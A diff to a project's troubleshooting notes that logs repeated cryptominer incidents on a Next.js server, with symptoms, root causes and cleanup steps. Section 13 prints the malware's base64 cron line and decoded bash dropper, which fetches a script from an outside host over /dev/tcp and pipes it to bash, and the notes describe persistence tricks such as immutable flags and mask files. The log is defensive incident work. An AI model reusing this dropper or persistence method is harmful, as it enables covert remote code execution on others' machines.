@@ -98,3 +98,132 @@
 - When changing how Next.js binds (`-H` flag, env vars), always verify that the middleware's hostname matching logic still works.
 - Test the deployed site immediately after any deployment script changes.
 - If you see 500 errors after a "successful" deploy, check `pm2 logs` for middleware rewrite headers like `x-middleware-rewrite`.
+
+## 10. Security Incident 4.0 (2026-01-17): Miner Recurrence & Regression
+**Symptom:** Server deployment hanging, high CPU usage. `top` showed process `upAG6QZ5` using 130% CPU.
+**Discovery:**
+- Miner returned because `deploy-direct.sh` was missing the `-H 127.0.0.1` flag in the PM2 start command.
+- Port 3000 was monitored as LISTENING on `*:3000` (Publicly exposed).
+**Root Cause:** Regression or reversion of `deploy-direct.sh` security hardening. The script was using `pm2 reload` (which ignores new args) and the fallback `pm2 start` command lacked the `-H` flag.
+**Resolution:**
+- Killed miner process (PID 567961).
+- Updated `deploy-direct.sh` to:
+  1. Explicitly run `pm2 delete estio-app` before starting (to prevent reload trap).
+  2. Add `-- -H 127.0.0.1` to the `pm2 start` command.
+**Status:** Fixed. Server load returning to normal.
+
+## 11. Infrastructure Incident (2026-01-17): OOM & Service Masking
+
+**Symptom:** Deployment script (`deploy-direct.sh`) hanging during `npm install`. `npm run dev` and build processes getting killed.
+
+**Discovery:**
+- `dmesg | grep "killed process"` showed multiple OOM kills.
+- `free -h` revealed 4GB swap was 82% full.
+- Docker and Caddy services failed to start with "Unit masked" errors.
+- `lsattr` showed immutable (`----i---------e-------`) flags on `/usr/bin/caddy`, `/usr/bin/containerd-shim-runc-v2`, and empty mask files in `/etc/systemd/system/` and `/run/systemd/system/`.
+
+**Root Cause:**
+1. **Memory Exhaustion**: Next.js 16 (Turbopack) build requires significantly more RAM than previous versions. The 4GB RAM + 4GB swap was insufficient.
+2. **Malware Remnants**: Previous cryptominer infections had set immutable attributes on system binaries and created mask files to prevent services from starting (persistence mechanism).
+
+**Resolution:**
+1. **Expanded Swap to 8GB**: Created a temporary 2GB swap file to provide breathing room, then replaced the main 4GB swap with an 8GB file.
+   ```bash
+   swapoff /swapfile && rm /swapfile
+   fallocate -l 8G /swapfile && chmod 600 /swapfile
+   mkswap /swapfile && swapon /swapfile
+   ```
+2. **Removed Immutable Flags**: Used `chattr -i` to clear immutable attributes from affected binaries and empty mask files.
+   ```bash
+   chattr -i /usr/bin/containerd-shim-runc-v2
+   chattr -i /usr/bin/caddy
+   rm -f /etc/systemd/system/containerd.service /run/systemd/system/containerd.service
+   rm -f /etc/systemd/system/caddy.service /run/systemd/system/caddy.service
+   ```
+3. **Reinstalled Packages**: Ran `apt-get install --reinstall containerd.io docker-ce caddy` to restore proper service files.
+
+**Prevention:**
+- The Hetzner server should ideally be upgraded to 8GB RAM to avoid relying on swap for routine builds.
+
+## 12. Security Incident 5.0 (2026-01-18): Miner Persistence & CPU Starvation
+
+**Symptom:** Application unresponsive (timeouts), 500 errors. `deploy-direct.sh` showed success but app was down.
+**Discovery:**
+- `top` command revealed process `zG5ciNDT` (PID 727558) utilizing **190.9% CPU**.
+- This starved the Next.js application (`estio-app`), causing it to hang on startup and time out requests.
+**Root Cause:**
+- Persistence mechanism from previous infection likely re-spawned the miner.
+- The process was running from `/tmp` or as a service.
+**Resolution:**
+- Killed process: `kill -9 727558`.
+- CPU usage dropped to near 0%.
+- Application restart attempted.
+**Status:** Monitoring. Immediate threat neutralized, but persistence source must be found (likely cron or systemd service).
+
+## 13. Security Incident 6.0 (2026-01-18): Persistence Mechanism FOUND & ELIMINATED
+
+**Symptom:** Cryptominer kept returning after every removal. Previous incidents (1-5) only killed the running process but never found how it kept coming back.
+
+**Discovery:**
+- Inspected `/etc/cron.d/` and found two infected files:
+  1. `/etc/cron.d/auto-upgrade` - Malicious cron job running at midnight
+  2. `/etc/cron.d/mdadm` - Second malicious cron job (masquerading as legitimate RAID monitoring)
+- Both files contained **base64-encoded malware payloads**:
+  ```
+  0 0 * * * root echo IyEvYmluL2Jhc2gK... | base64 -d | bash
+  ```
+- **Decoded payload:**
+  ```bash
+  #!/bin/bash
+  function __gogo() {
+    read -r proto server path <<<"$(printf '%s' "${1//// }")"
+    [ "$proto" != "http:" ] && return 1
+    DOC=/${path// //}; HOST=${server//:*}; PORT=${server//*:}
+    [ "$HOST" = "$PORT" ] && PORT=80
+    exec 3<>"/dev/tcp/${HOST}/$PORT"
+    printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
+    (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3
+    exec 3>&-
+  }
+  __gogo http://abcdefghijklmnopqrst.net | bash
+  ```
+- The malware downloads a script from `http://abcdefghijklmnopqrst.net` daily at midnight and pipes it to bash.
+- **Self-healing:** When the cron file was deleted, an in-memory watcher (likely inotify-based) immediately recreated the file.
+
+**Root Cause:**
+- Initial infection exploited exposed ports (3000 or 8080) on `0.0.0.0`.
+- Malware established persistence via cron and used inotify to protect those files from deletion.
+
+**Resolution:**
+1. Removed malicious cron files.
+2. Created empty replacement files.
+3. Set **immutable flag** (`chattr +i`) to prevent regeneration:
+   ```bash
+   rm -f /etc/cron.d/auto-upgrade
+   touch /etc/cron.d/auto-upgrade
+   chattr +i /etc/cron.d/auto-upgrade
+   
+   rm -f /etc/cron.d/mdadm
+   touch /etc/cron.d/mdadm
+   chattr +i /etc/cron.d/mdadm
+   ```
+4. Verified files are locked:
+   ```bash
+   lsattr /etc/cron.d/
+   # ----i---------e------- /etc/cron.d/auto-upgrade
+   # ----i---------e------- /etc/cron.d/mdadm
+   ```
+
+**Verification:**
+- CPU load returned to normal: `load average: 0.42, 0.88, 1.49`
+- No suspicious processes running
+- Port 3000 correctly bound to `127.0.0.1:3000` (not exposed)
+- Cron files are empty and immutable
+
+**Prevention:**
+- **Never** expose application ports (3000, 8080) to `0.0.0.0`. Always bind to `127.0.0.1`.
+- Regularly audit `/etc/cron.d/` for unexpected or modified files.
+- Consider running `rkhunter` or `chkrootkit` for deeper malware scans.
+- Monitor CPU usage with alerting (e.g., Hetzner Cloud monitoring, or Prometheus).
+
+
